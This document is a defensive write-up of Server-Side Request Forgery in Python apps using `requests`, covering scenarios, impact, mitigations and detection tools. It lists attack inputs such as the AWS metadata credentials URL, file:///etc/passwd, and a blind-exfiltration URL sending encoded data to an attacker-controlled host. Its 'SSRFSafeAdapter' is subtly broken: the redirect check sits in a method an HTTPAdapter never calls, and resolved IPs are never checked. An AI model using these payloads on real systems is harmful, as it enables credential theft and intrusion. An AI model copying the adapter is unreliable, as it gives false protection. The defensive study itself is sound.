# Deep Analysis of SSRF Attack Vector in `requests`-based Applications

## 1. Define Objective

**Objective:** To thoroughly analyze the Server-Side Request Forgery (SSRF) attack vector (node 1.1) within the broader context of data exfiltration/manipulation (node 1) in applications utilizing the `requests` library.  This analysis aims to identify specific vulnerabilities, assess their likelihood and impact, propose robust mitigation strategies, and evaluate the difficulty of both exploitation and detection.  The ultimate goal is to provide actionable recommendations for developers to secure their applications against SSRF attacks.

## 2. Scope

This analysis focuses exclusively on the following:

*   **Attack Tree Path:** 1. Data Exfiltration/Manipulation [CN] -> 1.1 Server-Side Request Forgery (SSRF) via `requests` [CN][HR]
*   **Library:** The Python `requests` library (https://github.com/psf/requests).
*   **Vulnerability Type:** Server-Side Request Forgery (SSRF).
*   **Application Context:**  Any Python application using `requests` to make HTTP requests, where user-supplied input (directly or indirectly) influences the target URL of those requests.  This includes, but is not limited to:
    *   Web applications taking URLs as input.
    *   APIs that fetch data from external resources based on user input.
    *   Services that process webhooks or callbacks.
    *   Applications that interact with cloud metadata services.

This analysis *does not* cover:

*   Other attack vectors within the broader attack tree (e.g., injection attacks not related to SSRF).
*   Vulnerabilities in other libraries or components of the application stack (unless they directly contribute to the SSRF vulnerability).
*   Client-side request forgery (CSRF).

## 3. Methodology

The analysis will follow these steps:

1.  **Vulnerability Definition:**  Clearly define the SSRF vulnerability in the context of the `requests` library.
2.  **Exploitation Scenarios:**  Detail realistic scenarios where an attacker could exploit the vulnerability, including specific examples of malicious payloads.
3.  **Impact Assessment:**  Quantify the potential damage from a successful SSRF attack, considering data breaches, internal system compromise, and denial of service.
4.  **Likelihood Assessment:**  Estimate the probability of a successful attack, considering factors like the prevalence of vulnerable code patterns and the attacker's skill level.
5.  **Mitigation Strategies:**  Propose multiple, layered defense mechanisms to prevent or mitigate SSRF attacks, with a focus on practical implementation details.
6.  **Detection Techniques:**  Describe methods for detecting SSRF attempts, both in development and production environments.
7.  **Code Examples:** Provide concrete Python code snippets demonstrating both vulnerable code and secure implementations.
8.  **Tooling:** Recommend tools that can assist in identifying and preventing SSRF vulnerabilities.

## 4. Deep Analysis of Attack Tree Path: 1.1 Server-Side Request Forgery (SSRF) via `requests`

### 4.1 Vulnerability Definition

SSRF occurs when an attacker can control the URL (or part of the URL) that a server-side application uses to make a request.  The `requests` library itself is *not* inherently vulnerable; it simply performs the HTTP request as instructed.  The vulnerability lies in how the application *uses* `requests` without properly validating or sanitizing user-provided input that influences the request URL.  `requests` will happily fetch data from `file:///etc/passwd` or `http://169.254.169.254/latest/meta-data/` if the application passes those URLs to it.

### 4.2 Exploitation Scenarios

Here are several concrete exploitation scenarios, building on the initial example:

*   **Scenario 1: Accessing Internal Services:**
    *   **Vulnerable Code:**
        ```python
        import requests
        def fetch_data(user_url):
            response = requests.get(user_url)
            return response.text
        ```
    *   **Attacker Input:** `http://localhost:8080/admin` (assuming an internal admin panel exists)
    *   **Result:** The attacker gains access to the internal admin panel, potentially allowing them to modify configurations, access sensitive data, or execute commands.

*   **Scenario 2: Cloud Metadata Exfiltration (AWS Example):**
    *   **Vulnerable Code:** (Same as above)
    *   **Attacker Input:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
    *   **Result:** The attacker retrieves temporary AWS credentials, potentially granting them access to other AWS resources.  Similar attacks exist for Azure, GCP, and other cloud providers.

*   **Scenario 3: Reading Local Files:**
    *   **Vulnerable Code:** (Same as above)
    *   **Attacker Input:** `file:///etc/passwd`
    *   **Result:** The attacker reads the contents of the `/etc/passwd` file, potentially revealing user account information.

*   **Scenario 4: Port Scanning:**
    *   **Vulnerable Code:** (Same as above)
    *   **Attacker Input:**  A series of requests like `http://internal-server:21`, `http://internal-server:22`, `http://internal-server:80`, etc.
    *   **Result:** The attacker can infer which ports are open on the internal server by observing response times or error messages.

*   **Scenario 5: Blind SSRF (Data Exfiltration via DNS):**
    *   **Vulnerable Code:** (Same as above)
    *   **Attacker Input:** `http://xssrf.attacker-controlled.com/?data=` + base64 encoded data from internal service. The attacker sets up a DNS server to log requests.
    *   **Result:** Even if the response content isn't directly returned to the attacker, they can exfiltrate data by encoding it in the hostname or path of a request to a server they control.

* **Scenario 6: SSRF via Redirection**
    *   **Vulnerable Code:**
        ```python
        import requests
        def fetch_data(user_url):
            response = requests.get(user_url, allow_redirects=True) #Default behavior
            return response.text
        ```
    * **Attacker Input:** `http://attacker.com/redirect` where `attacker.com/redirect` issues a 302 redirect to `http://169.254.169.254/latest/meta-data/`.
    * **Result:** The `requests` library follows the redirect, leading to the same outcome as Scenario 2.

### 4.3 Impact Assessment

The impact of a successful SSRF attack is **Very High**:

*   **Data Breach:** Access to sensitive internal data, including database credentials, API keys, customer information, and proprietary code.
*   **Internal System Compromise:**  Ability to interact with internal services, potentially leading to remote code execution (RCE) on internal servers.
*   **Denial of Service (DoS):**  The attacker could flood internal systems with requests, causing them to become unavailable.
*   **Cloud Resource Abuse:**  Access to cloud metadata can lead to the theft of temporary credentials, allowing the attacker to access and abuse cloud resources.
*   **Reputational Damage:**  Data breaches and service disruptions can severely damage the reputation of the organization.

### 4.4 Likelihood Assessment

The likelihood depends heavily on the implementation:

*   **High (without proper validation):** If the application directly uses user-provided URLs in `requests` calls without any validation, the likelihood is very high.  This is a common mistake.
*   **Medium (with basic validation):** If the application performs some basic validation (e.g., checking for "http://" or "https://"), the likelihood is reduced, but still significant.  Attackers can often bypass simple checks.
*   **Low (with strict whitelisting):** If the application uses a strict whitelist of allowed domains and paths, and performs thorough validation *before* making the request, the likelihood is low.

**Overall Likelihood:**  Given the prevalence of vulnerable code patterns and the relative ease of exploitation, the overall likelihood is considered **Medium to High**.

### 4.5 Mitigation Strategies

A layered defense is crucial:

1.  **Strict URL Whitelisting (Primary Defense):**
    *   **Implementation:** Maintain a list of allowed domains and, if possible, specific paths.  *Before* making a request with `requests`, check if the user-provided URL matches an entry in the whitelist.  Use a robust URL parsing library (like `urllib.parse`) to decompose the URL and compare components.
    *   **Code Example (Secure):**
        ```python
        import requests
        from urllib.parse import urlparse

        ALLOWED_DOMAINS = {"example.com", "api.example.com"}

        def fetch_data_secure(user_url):
            parsed_url = urlparse(user_url)
            if parsed_url.netloc not in ALLOWED_DOMAINS:
                raise ValueError("Invalid URL")
            # Further path validation can be added here
            response = requests.get(user_url)
            return response.text
        ```

2.  **Input Validation (Defense in Depth):**
    *   **Scheme Validation:**  Only allow `http` and `https` schemes.
    *   **Hostname Validation:**
        *   Prefer whitelisting domains over IP addresses.
        *   *Never* allow loopback addresses (127.0.0.1, ::1).
        *   *Never* allow link-local addresses (169.254.0.0/16, fe80::/10).
        *   Consider using a DNS resolver to validate the hostname *before* passing it to `requests` (but be aware of Time-of-Check to Time-of-Use (TOCTOU) issues).
    *   **Port Validation:**  Restrict to standard ports (80, 443) unless absolutely necessary.
    *   **Path Validation:**  Sanitize the path to prevent directory traversal attacks (e.g., using `..` or `%2e%2e`).
    *   **Query Parameter Validation:**  Validate and sanitize any query parameters.

3.  **Disable Redirects (If Possible):**
    *   **Implementation:**  Set `allow_redirects=False` in the `requests.get()` or `requests.post()` call.  This prevents the attacker from using a redirect to bypass URL validation.
    *   **Code Example:**
        ```python
        response = requests.get(user_url, allow_redirects=False)
        ```

4.  **Network Segmentation:**
    *   **Implementation:**  Use firewalls and network policies to restrict access to internal resources.  The application server should not be able to directly access sensitive internal systems.

5.  **Custom `requests.adapters.HTTPAdapter`:**
    *   **Implementation:** Create a custom adapter to perform additional checks, such as hostname validation *after* DNS resolution. This can help mitigate TOCTOU issues.
    *   **Code Example (Advanced):**
        ```python
        import requests
        from requests.adapters import HTTPAdapter
        from urllib.parse import urlparse
        import socket

        ALLOWED_HOSTS = {"example.com", "api.example.com"}

        class SSRFSafeAdapter(HTTPAdapter):
            def resolve_redirect(self, resp, req, **kwargs):
                parsed_url = urlparse(resp.headers['Location'])
                if parsed_url.netloc not in ALLOWED_HOSTS:
                    raise ValueError("Invalid redirect location")
                return super().resolve_redirect(resp, req, **kwargs)

            def send(self, request, **kwargs):
                parsed_url = urlparse(request.url)
                try:
                    socket.gethostbyname(parsed_url.netloc) # Force DNS resolution
                except socket.gaierror:
                    raise ValueError("Invalid hostname")

                if parsed_url.netloc not in ALLOWED_HOSTS:
                    raise ValueError("Invalid URL")
                return super().send(request, **kwargs)

        s = requests.Session()
        s.mount("http://", SSRFSafeAdapter())
        s.mount("https://", SSRFSafeAdapter())

        # Now use the session 's' for requests
        # response = s.get("http://example.com")
        ```

6.  **Least Privilege:**  Run the application with the minimum necessary privileges.  This limits the damage an attacker can do if they achieve SSRF.

7. **Request Timeouts:** Use timeouts to prevent attackers from tying up resources by making requests to slow or unresponsive internal services.
    ```python
    response = requests.get(user_url, timeout=5) # 5-second timeout
    ```

### 4.6 Detection Techniques

*   **Static Analysis:** Use static analysis tools (e.g., Bandit, Semgrep) to identify potentially vulnerable code patterns.  Look for instances where user-provided input is used directly in `requests` calls without validation.
*   **Dynamic Analysis:** Use web application security scanners (e.g., OWASP ZAP, Burp Suite) to test for SSRF vulnerabilities.  These tools can automatically send malicious payloads and analyze the responses.
*   **Log Monitoring:** Monitor application logs for suspicious requests, such as requests to internal IP addresses, unusual ports, or cloud metadata endpoints.
*   **Intrusion Detection/Prevention Systems (IDS/IPS):** Configure IDS/IPS rules to detect and block SSRF attempts.
*   **Web Application Firewall (WAF):**  A WAF can be configured to block requests that match known SSRF patterns.
*   **Code Review:**  Thorough code reviews are essential to identify and fix SSRF vulnerabilities before they reach production.

### 4.7 Tooling

*   **Bandit:** A security linter for Python code.  Can detect some SSRF vulnerabilities.
*   **Semgrep:** A fast, open-source static analysis tool that can be used to create custom rules for detecting SSRF.
*   **OWASP ZAP:**  A free and open-source web application security scanner.
*   **Burp Suite:**  A commercial web application security testing tool (with a free community edition).
*   **ssrf-sheriff:** A specialized tool designed to find and exploit SSRF vulnerabilities.
* **trufflehog:** Searches through git repositories for high entropy strings and secrets, digging deep into commit history.

### 4.8 Summary and Recommendations

SSRF is a serious vulnerability that can have devastating consequences.  Applications using the `requests` library must implement robust input validation and other defense-in-depth measures to prevent attackers from exploiting this vulnerability.  Strict URL whitelisting is the most effective mitigation strategy, but it should be combined with other techniques, such as input validation, disabling redirects, network segmentation, and using a custom `HTTPAdapter`.  Regular security testing and code reviews are essential to ensure that SSRF vulnerabilities are identified and fixed promptly.  Developers should prioritize security and treat all user-provided input as potentially malicious.
